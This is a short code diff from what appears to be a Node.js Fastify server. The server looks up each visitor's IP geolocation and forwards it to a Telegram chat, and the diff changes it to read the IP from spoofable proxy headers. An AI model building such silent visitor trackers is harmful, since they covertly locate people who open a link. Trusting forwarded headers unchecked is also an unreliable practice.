@@ -18,7 +18,8 @@ async function sendToTelegram(message) {
 }
 
 fastify.get('/', async (req, res) => {
-	const {ip} = req;
+	const {headers} = req;
+	const ip = headers['x-real-ip'] || headers['x-forwarded-for']
 	const ipDetails = await fetch(`http://ip-api.com/json/${ip}?fields=4255257`)
 		.then(res => res.json());
 	await sendToTelegram(
